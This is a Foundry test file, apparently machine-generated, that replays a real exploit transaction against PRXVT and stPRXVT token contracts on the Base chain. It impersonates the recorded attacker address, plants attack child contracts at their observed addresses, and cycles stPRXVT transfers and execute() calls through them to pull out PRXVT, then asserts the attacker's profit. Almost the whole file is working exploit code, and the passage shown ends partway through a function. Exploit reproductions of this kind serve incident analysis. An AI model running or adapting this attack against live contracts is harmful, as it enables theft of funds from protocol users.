// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x7407f9bdc4140d5e284ea7de32a9de6037842f45
// Attack Contract : 0x702980b1ed754c214b79192a4d7c39106f19bce9
// Vulnerable Contract : 0x702980b1ed754c214b79192a4d7c39106f19bce9
// Attack Tx : 0xf42a8fe556d5e4ab59b0b7675ccbcd1425e7e2a6a8e0c9775fc6cd7c48ff55a1
// Block : 40230107
// Chain : Base
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 40230106;
    uint256 constant TX_TIMESTAMP = 1767249561;
    uint256 constant TX_BLOCK_NUMBER = 40230107;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttackContrac();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        bytes memory entryData = abi.encodeWithSelector(
            bytes4(0xe6d7db7e), uint256(0x00000000000000000000000000000000000000000000000000000000000927c0)
        );
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttackContrac() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntimeFallb();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _installAttackChildR();
        _bindAttackAttackChi(attack);
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return Addresses.attack_child;
    }

    function _installRuntimeFallb() internal {
        // Exact-address fallback for observed CREATE/CREATE2 and callback surfaces.
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _installAttackChildR() internal {
        // Exact-address fallback for attack child contracts that were dynamically created in the trace.
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child constructor=0x07cf59f84c0d8ad79dda77f6fa71e19be08e3242|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_21A6 constructor=0x10318e391ba9dfb517f7d0f521bf2691d32821a6|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        vm.etch(Addresses.attack_child_21A6, type(AttackChild).runtimeCode);
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_7D8E constructor=0x19ceebdd5838c60e73d7557f8950da0ed0457d8e|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        vm.etch(Addresses.attack_child_7D8E, type(AttackChild).runtimeCode);
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_F368 constructor=0x25c9ca5e593553c696ebb09ed675b0f09b5ef368|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        vm.etch(Addresses.attack_child_F368, type(AttackChild).runtimeCode);
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_38A8 constructor=0x72cdff23db035d4959901158d230c0c8642a38a8|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        vm.etch(Addresses.attack_child_38A8, type(AttackChild).runtimeCode);
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_8466 constructor=0x8d7bf27794b53129a143b120b1852fe3048e8466|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        vm.etch(Addresses.attack_child_8466, type(AttackChild).runtimeCode);
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_960D constructor=0x9a95cee3b8ef78b76d3f38dc45f2230bd4fc960d|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        vm.etch(Addresses.attack_child_960D, type(AttackChild).runtimeCode);
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_5349 constructor=0x9ff99efad40cd6ff67d7552bbec5434653fa5349|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        vm.etch(Addresses.attack_child_5349, type(AttackChild).runtimeCode);
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_B5EB constructor=0xb649491dcbc08560ecd2a8ae621bcf1d33b9b5eb|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        vm.etch(Addresses.attack_child_B5EB, type(AttackChild).runtimeCode);
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_BD4E constructor=0xd6e87e48968b44c5eb79ee3f7697bb8efa19bd4e|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        vm.etch(Addresses.attack_child_BD4E, type(AttackChild).runtimeCode);
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_F4AD constructor=0xea6e0b9f162e5532389f32832529a794bf10f4ad|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        vm.etch(Addresses.attack_child_F4AD, type(AttackChild).runtimeCode);
    }

    function _bindAttackAttackChi(OurAttack attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.PRXVT, "PRXVT", 1968873386914157328000);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    AttackChild public attackChild_1;
    AttackChild public attackChild_2;
    AttackChild public attackChild_3;
    AttackChild public attackChild_4;
    AttackChild public attackChild_5;
    AttackChild public attackChild_6;
    AttackChild public attackChild_7;
    AttackChild public attackChild_8;
    AttackChild public attackChild_9;
    AttackChild public attackChild_10;

    function deployAttackChildContracts() external returns (address) {
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild) constructor=0x07cf59f84c0d8ad79dda77f6fa71e19be08e3242|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0x07Cf59f84c0D8aD79dda77F6fA71E19bE08e3242));
        }
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_1) constructor=0x10318e391ba9dfb517f7d0f521bf2691d32821a6|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        if (address(attackChild_1) == address(0)) {
            attackChild_1 = AttackChild(payable(0x10318e391bA9Dfb517f7d0f521Bf2691d32821A6));
        }
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_2) constructor=0x19ceebdd5838c60e73d7557f8950da0ed0457d8e|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        if (address(attackChild_2) == address(0)) {
            attackChild_2 = AttackChild(payable(0x19CeEBDD5838C60E73d7557f8950Da0ED0457D8e));
        }
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_3) constructor=0x25c9ca5e593553c696ebb09ed675b0f09b5ef368|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        if (address(attackChild_3) == address(0)) {
            attackChild_3 = AttackChild(payable(0x25c9ca5e593553c696EBB09ED675b0f09B5Ef368));
        }
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_4) constructor=0x72cdff23db035d4959901158d230c0c8642a38a8|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        if (address(attackChild_4) == address(0)) {
            attackChild_4 = AttackChild(payable(0x72CDfF23dB035D4959901158d230c0c8642a38a8));
        }
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_5) constructor=0x8d7bf27794b53129a143b120b1852fe3048e8466|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        if (address(attackChild_5) == address(0)) {
            attackChild_5 = AttackChild(payable(0x8D7bf27794B53129a143b120B1852Fe3048E8466));
        }
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_6) constructor=0x9a95cee3b8ef78b76d3f38dc45f2230bd4fc960d|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        if (address(attackChild_6) == address(0)) {
            attackChild_6 = AttackChild(payable(0x9A95CEe3B8Ef78b76d3f38dC45F2230Bd4fC960d));
        }
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_7) constructor=0x9ff99efad40cd6ff67d7552bbec5434653fa5349|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        if (address(attackChild_7) == address(0)) {
            attackChild_7 = AttackChild(payable(0x9ff99efAd40cD6FF67d7552bBEc5434653FA5349));
        }
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_8) constructor=0xb649491dcbc08560ecd2a8ae621bcf1d33b9b5eb|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        if (address(attackChild_8) == address(0)) {
            attackChild_8 = AttackChild(payable(0xB649491dcBC08560eCD2a8AE621bCf1d33B9b5eb));
        }
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_9) constructor=0xd6e87e48968b44c5eb79ee3f7697bb8efa19bd4e|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        if (address(attackChild_9) == address(0)) {
            attackChild_9 = AttackChild(payable(0xd6E87E48968B44c5Eb79ee3f7697bB8efa19bD4E));
        }
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_10) constructor=0xea6e0b9f162e5532389f32832529a794bf10f4ad|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
        if (address(attackChild_10) == address(0)) {
            attackChild_10 = AttackChild(payable(0xEA6E0B9f162E5532389f32832529a794bf10F4AD));
        }
        return address(attackChild);
    }

    function attack() external payable {
        if (address(attackChild) == address(0)) {
            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild) constructor=0x07cf59f84c0d8ad79dda77f6fa71e19be08e3242|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
            if (address(attackChild) == address(0)) {
                attackChild = AttackChild(payable(0x07Cf59f84c0D8aD79dda77F6fA71E19bE08e3242));
            }
            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_1) constructor=0x10318e391ba9dfb517f7d0f521bf2691d32821a6|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
            if (address(attackChild_1) == address(0)) {
                attackChild_1 = AttackChild(payable(0x10318e391bA9Dfb517f7d0f521Bf2691d32821A6));
            }
            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_2) constructor=0x19ceebdd5838c60e73d7557f8950da0ed0457d8e|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
            if (address(attackChild_2) == address(0)) {
                attackChild_2 = AttackChild(payable(0x19CeEBDD5838C60E73d7557f8950Da0ED0457D8e));
            }
            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_3) constructor=0x25c9ca5e593553c696ebb09ed675b0f09b5ef368|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
            if (address(attackChild_3) == address(0)) {
                attackChild_3 = AttackChild(payable(0x25c9ca5e593553c696EBB09ED675b0f09B5Ef368));
            }
            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_4) constructor=0x72cdff23db035d4959901158d230c0c8642a38a8|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
            if (address(attackChild_4) == address(0)) {
                attackChild_4 = AttackChild(payable(0x72CDfF23dB035D4959901158d230c0c8642a38a8));
            }
            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_5) constructor=0x8d7bf27794b53129a143b120b1852fe3048e8466|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
            if (address(attackChild_5) == address(0)) {
                attackChild_5 = AttackChild(payable(0x8D7bf27794B53129a143b120B1852Fe3048E8466));
            }
            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_6) constructor=0x9a95cee3b8ef78b76d3f38dc45f2230bd4fc960d|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
            if (address(attackChild_6) == address(0)) {
                attackChild_6 = AttackChild(payable(0x9A95CEe3B8Ef78b76d3f38dC45F2230Bd4fC960d));
            }
            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_7) constructor=0x9ff99efad40cd6ff67d7552bbec5434653fa5349|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
            if (address(attackChild_7) == address(0)) {
                attackChild_7 = AttackChild(payable(0x9ff99efAd40cD6FF67d7552bBEc5434653FA5349));
            }
            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_8) constructor=0xb649491dcbc08560ecd2a8ae621bcf1d33b9b5eb|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
            if (address(attackChild_8) == address(0)) {
                attackChild_8 = AttackChild(payable(0xB649491dcBC08560eCD2a8AE621bCf1d33B9b5eb));
            }
            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_9) constructor=0xd6e87e48968b44c5eb79ee3f7697bb8efa19bd4e|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
            if (address(attackChild_9) == address(0)) {
                attackChild_9 = AttackChild(payable(0xd6E87E48968B44c5Eb79ee3f7697bB8efa19bD4E));
            }
            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_10) constructor=0xea6e0b9f162e5532389f32832529a794bf10f4ad|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
            if (address(attackChild_10) == address(0)) {
                attackChild_10 = AttackChild(payable(0xEA6E0B9f162E5532389f32832529a794bf10F4AD));
            }
        }
        _replayProtocolCalls();
        _settleTokenFlows();
        _replayProtocolCal6();
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(4));
            observedSalt;
            address created = address(attackChild_3);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_3)))._prepareAttackChild4();
        {
            uint256 transferActionGraphAmount_5 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_3), transferActionGraphAmount_5);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        AttackChild(payable(address(attackChild_3)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(5));
            observedSalt;
            address created = address(attackChild_6);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_6)))._prepareAttackChild7();
        {
            uint256 transferActionGraphAmount_6 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_6), transferActionGraphAmount_6);
        }
        _replayProtocolCal2();
        _replayProtocolCal3();
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(8));
            observedSalt;
            address created = address(attackChild_2);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_2)))._prepareAttackChild3();
        {
            uint256 transferActionGraphAmount_9 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_2), transferActionGraphAmount_9);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        AttackChild(payable(address(attackChild_2)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(9));
            observedSalt;
            address created = address(attackChild_4);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_4)))._prepareAttackChild5();
        {
            uint256 transferActionGraphAmount_10 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_4), transferActionGraphAmount_10);
        }
        _replayProtocolCal4();
        _replayProtocolCal5();
    }

    function _deployAttackChild3() internal {
        _replayProtocolCalls();
        _settleTokenFlows();
        _replayProtocolCal6();
        _deployAttackChild2();
        _replayProtocolCal2();
        _replayProtocolCal3();
        _deployAttackChildCo();
        _replayProtocolCal4();
        _replayProtocolCal5();
    }

    function _replayProtocolCalls() internal {
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(0));
            observedSalt;
            address created = address(attackChild_9);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_9)))._prepareAttackChild1();
        {
            uint256 transferActionGraphAmount = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_9), transferActionGraphAmount);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        AttackChild(payable(address(attackChild_9)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(1));
            observedSalt;
            address created = address(attackChild_5);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_5)))._prepareAttackChild6();
    }

    function _settleTokenFlows() internal {
        {
            uint256 transferActionGraphAmount_2 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_5), transferActionGraphAmount_2);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        AttackChild(payable(address(attackChild_5)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(2));
            observedSalt;
            address created = address(attackChild_8);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild_8)))._prepareAttackChild9();
        {
            uint256 transferActionGraphAmount_3 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_8), transferActionGraphAmount_3);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
    }

    function _replayProtocolCal6() internal {
        AttackChild(payable(address(attackChild_8)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            bytes32 observedSalt = bytes32(uint256(3));
            observedSalt;
            address created = address(attackChild);
            require(created.code.length != 0, "observed attack child runtime missing");
        }
        AttackChild(payable(address(attackChild)))._prepareAttackChild();
        {
            uint256 transferActionGraphAmount_4 = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild), transferActionGraphAmount_4);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
